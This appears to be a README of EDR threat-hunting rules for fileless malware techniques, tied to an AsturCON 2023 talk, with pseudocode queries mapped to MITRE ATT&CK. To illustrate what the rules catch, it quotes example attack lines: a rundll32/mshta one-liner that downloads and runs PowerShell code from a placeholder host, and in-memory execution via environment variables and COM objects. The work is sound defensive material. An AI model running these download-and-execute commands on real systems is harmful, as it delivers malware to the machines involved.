# Fileless Malware Techniques detection rules
Threat Hunting rules related to the fileless malware techniques presented in the conference AsturCON 2023 in Oviedo. These rules are aimed to be used in EDRs, but do not use any EDR language in particular (except one of them) so as to avoid technology dependence. They are written in pseudocode and can be easily translated to any EDR language in order to be used.

## [TA0001][T1566.002] Using well-known web services to store malware

Many malware or threat groups (such as Aggah) use common web services to store their malware and then download them from the victim machines. They can use Github, Google drive, BitBucket, Discord... With this query we look for connections to these web services from common Windows LOLBins, which may indicate an attempt to download malware.

```
event_ type = NETWORK and URL has_any ("blogspot.com", "pastebin.com", "bitbucket.org", "archive.org", "zkdusercontent.com", "raw.githubusercontent.com", "cdn.discordapp.com",  "drive.google.com", "www.googleapis.com")
and process_name in ("mshta.exe", "wscript.exe", "cscript.exe", "powershell.exe", "pwsh.exe", "cmd.exe", "certutil.exe", "hh.exe", "rundll32.exe", "regsvr32.exe")
```
## [TA0005][T1218.005] Executing VBScript or Javascript code in memory with rundll32.exe, mshta.exe, cscript or wscript

These four LOLBins can be used to execute VBScript or Javascript code in memory, with commands similar to:

*rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")*

*mshta.exe javascript:a=GetObject("script:https://webserver/payload[.]sct").Exec();close();*

```
event_type = PROCESS and process_name in ("rundll32.exe", "mshta.exe", "cscript.exe", "wscript.exe") and process_commandline has_any ("vbscript", "javascript")

```

## [TA0005][T1218.011] Executing payload stored in COM with rundll32.exe

COM objects can be executed with rundll32.exe by using a command similar to:

*rundll32.exe -sta {CLSID}*

Where {CLSID} corresponds to the COM object ID.

```
event_type = PROCESS and process_name = "rundll32.exe" and process_commandline regexp "-sta\s+\{[A-F0-9]{8}\-([A-F0-9]{4}\-){3}[A-F0-9]{12}\}" 
```

## [TA0002][T1059.001] Executing PowerShell with environment variables

Some fileless malware, such as Kovter (https://www.malwarebytes.com/blog/news/2016/07/untangling-kovter), store code in environment variables and then execute this code in memory using PowerShell, with commands similar to:

*powershell.exe iex $env:asdf*

Where "asdf" is the name of the environment variable.

```
event_type = PROCESS and process_name = "powershell.exe" and process_commandline regexp ".*iex.*\$env:.*"
```

## [TA0005][T1055] werfault.exe or conhost.exe spawning suspicious child process

Conhost.exe and werfault.exe do not commonly spawn child processes, aside from themselves. Therefore, if they are spawning any other process, it may indicate that a process injection has occurred. 

```
event_type = PROCESS and process_name in ("conhost.exe", "werfault.exe") and child_process_name in ("rundll32.exe", "cmd.exe", "regsvr32.exe", "cmd.exe", "powershell.exe", "powershell_ise.exe", "pwsh.exe", "cscript.exe", "wscript.exe", "hh.exe", "certutil.exe", "mshta.exe", "wmic.exe", "schtasks.exe", "reg.exe") 
```

## [TA0005][T1055.002] Process injected in regsvr32.exe or rundll32.exe
Both regsvr32.exe and rundll32.exe are commonly executed with some parameters in their command line. The execution of these processes without parameters, may be indicative of process injection.

```
event_type = PROCESS and process_name in ("regsvr32.exe", "rundll32.exe") and process_commandline regexp "^\"?(regsvr32|rundll32)(\.exe)?\"?$"
```

## [TA0005][T1112] Suspicious registry key under shell/open/command
Fileless malware, such as Kovter, need to store their malicious code in some place so as to execute it later on. In the case of Kovter, it has been seen that it commonly uses /shell/open/command registry keys to store its code (https://www.malwarebytes.com/blog/news/2016/07/untangling-kovter).

It creates a new file extension and specifies in the /shell/open/command registry key that, when we open this type of file, it should execute some code.

```
event_type = REGISTRY and key_name regexp "^(HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes|HKEY_USERS\\S-[0-9\-]+_Classes)\\[a-z0-9]{1,8}\\shell\\open\\command$" and registry_data has_any ("wscript", "cscript", "javascript", "mshta", "powershell", "pwsh", "cmd.exe")
```

## [TA0003][T1546.003] WMI persistence
We can look for the creation of WMI persistence through PowerShell in the event log, looking for executed PowerShell commands. There are some XDRs that allow you to look inside those event log events.
```
event_type = EVENT_LOG and eventlog_data contains "powershell"
and (eventlog_data contains "EventFilter" or eventlog_data contains "EventConsumer" or eventlog_data contains "__FilterToConsumerBinding")
```

Furthermore, in the case of Cortex XDR, we could see that when WMI persistence was established, the executed command had as parent actor_process_image_name = "svchost.exe". Nevertheless, the OS parent was: os_actor_process_image_name = "wmiprvse.exe". This opens us a way to look for that kind of persistence in this EDR:
```
config case_sensitive = false
| dataset = xdr_data 
| filterÂ  event_type = ENUM.PROCESS and os_actor_process_image_name = "wmiprvse.exe" and actor_process_image_name = "svchost.exe" and action_process_image_command_line != null
| fields actor_process_image_name , os_actor_process_image_name , action_process_image_command_line
```

## [TA0003][T1053.005] Scheduled task created with suspicious commands
In the case of fileless malware, they commonly use scheduled tasks to establish persistence. Instead of executing a file, these tasks will execute a legitimate Windows binary to perform some activity: download, send information, etc.

```
event_type = PROCESS and process_name = "schtasks.exe" and process_commandline contains "/create" and process_commandline has_any ("wscript", "cscript", "javascript", "mshta", "powershell", "pwsh")
```

## [TA0003][T1547.001] Autorun registry key created with suspicious command
Another way in which fileless threats establish persistence is by using Autorun registry keys.

```
event_type = REGISTRY and event_sub_type = REGISTRY_SET_VALUE and key_name regexp ".*\\Software\\Microsoft\\Windows\\CurrentVersion\\(Run(Once)?)|(Explorer\\(User )?Shell Folders)|(RunServices(Once)?)|Policies\\Explorer\\Run$"
and registry_data has_any ("wscript", "cscript", "javascript", "mshta", "powershell", "pwsh")
```


